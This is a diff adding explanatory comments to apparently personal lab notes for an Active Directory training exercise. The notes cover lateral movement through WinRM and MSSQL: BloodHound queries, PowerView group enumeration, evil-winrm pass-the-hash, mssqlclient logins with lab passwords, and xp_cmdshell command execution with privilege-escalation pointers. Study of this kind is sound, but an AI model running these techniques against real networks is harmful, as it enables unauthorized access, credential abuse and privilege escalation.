@@ -35,6 +35,7 @@ enable_xp_cmdshell
 xp_cmdshell whoami /priv
 xp_cmdshell type C:\Users\TARGET\Desktop\flag.txt
 ```
+> Quick reference for three types of remote access. Replace group names, computer names, and IPs for your target. `-H` on evil-winrm accepts an NTLM hash for pass-the-hash when you do not have the plaintext password.
 
 **BloodHound custom Cypher queries:**
 ```cypher
@@ -44,6 +45,7 @@ MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:C
 # Find SQL Admin access
 MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
 ```
+> Cypher queries for the BloodHound graph database. Paste these into the Raw Query box in the BloodHound GUI. They find users who have WinRM or SQL admin access via group membership paths.
 
 ---
 
@@ -57,7 +59,7 @@ After gaining a foothold, check every account you control for three types of rem
 | WinRM | `CanPSRemote` | Remote Management Users | evil-winrm, Enter-PSSession |
 | MSSQL sysadmin | `SQLAdmin` | — (SPN-based) | mssqlclient.py, PowerUpSQL |
 
-**Why it matters:** Even without local admin, any of these gets you a shell on a new host to hunt creds, escalate privileges, or pivot further into the network.
+**Why it matters:** Even without local admin rights, any of these gives you a shell on a new host. From there you can hunt credentials, escalate privileges, or pivot deeper into the network.
 
 ---
 
@@ -92,6 +94,7 @@ Import-Module .\PowerView.ps1
 Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
 # Result: INLANEFREIGHT\forend
 ```
+> Lists members of the Remote Management Users group on a single host. Replace the computer name for your target. Any account listed here can open a WinRM session without needing local admin rights.
 - `Remote Management Users` = the group that controls WinRM access on a host
 - Membership here means the user can open a remote PS session without needing local admin
 - Checking a single host is fast — but we might miss users with access on other hosts
@@ -104,6 +107,7 @@ Get-DomainComputer | Get-NetLocalGroupMember -GroupName "Remote Management Users
 # ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL  →  INLANEFREIGHT\bdavis
 # ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL  →  INLANEFREIGHT\forend
 ```
+> Queries every domain computer for WinRM group membership in one sweep. This is slow but thorough. It found bdavis with WinRM access to the Domain Controller (DC) — a high-value finding.
 - `Get-DomainComputer` = pulls every computer object from AD
 - Piped into `Get-NetLocalGroupMember` = checks the Remote Management Users group on each host
 - This reveals **bdavis** has WinRM access to the Domain Controller — high value finding
@@ -118,6 +122,7 @@ Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
 # [ACADEMY-EA-MS01]: PS C:\Users\forend\Documents>
 Exit-PSSession
 ```
+> Opens an interactive PowerShell session on MS01 as forend. Replace the computer name, username, and password for your target. Use `Exit-PSSession` when done.
 - `Enter-PSSession` = interactive PowerShell session on the remote host
 - `-Credential` = authenticate as forend without switching your local session
 - From here you can run any PS commands as if you were sitting at that machine
@@ -129,6 +134,7 @@ evil-winrm -i 10.129.x.x -u forend -p Klmcargo2
 # or with hash (no plaintext needed):
 evil-winrm -i 10.129.x.x -u forend -H NTLM_HASH
 ```
+> Connects to WinRM from Linux and drops into a PowerShell shell. Use `-p` for a plaintext password or `-H` for pass-the-hash with an NTLM hash. Replace IP, username, and credentials for your target.
 - evil-winrm = Linux WinRM client — gives you a PS shell on the target
 - `-H` = pass-the-hash, useful when you have the NTLM hash but not the plaintext password
 
@@ -140,6 +146,7 @@ Import-Module .\PowerUpSQL.ps1
 Get-SQLInstanceDomain
 # Result: ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433 — service account: damundsen
 ```
+> Queries AD for all SQL Server instances by looking for MSSQL Service Principal Names (SPNs). Shows the hostname, port, and the service account running each instance. If you control the service account, you can authenticate.
 - PowerUpSQL queries AD for MSSQL SPNs — same approach as Kerberoasting enumeration
 - `DomainAccount` = the AD account running the SQL service — if you have rights over this account, you can authenticate
 - damundsen's password was set to `SQL1234!` via our ACL abuse chain in section 21
@@ -155,6 +162,7 @@ ssh htb-student@172.16.5.225
 mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
 # password: SQL1234!
 ```
+> Connects to the MSSQL server using Windows domain credentials. `-windows-auth` uses Kerberos or NTLM instead of SQL login. Replace domain, user, and IP for your target.
 - `-windows-auth` = authenticate using Windows/AD credentials instead of a SQL login
 - This works because damundsen has sysadmin rights on this SQL instance (SQLAdmin edge in BloodHound)
 
@@ -170,6 +178,7 @@ xp_cmdshell whoami /priv
 xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
 -- Result: 1m_the_sQl_@dm1n_n0w!
 ```
+> Enables OS command execution from inside SQL Server. `enable_xp_cmdshell` is a mssqlclient.py shortcut that runs the two required `sp_configure` commands. Check `whoami /priv` first — `SeImpersonatePrivilege` means you can escalate to SYSTEM with PrintSpoofer.
 - `xp_cmdshell` = runs OS commands as the SQL Server service account (not damundsen)
 - The SQL service account nearly always has `SeImpersonatePrivilege` enabled
 - `SeImpersonatePrivilege` → local privesc to SYSTEM via PrintSpoofer, JuicyPotato, or RoguePotato
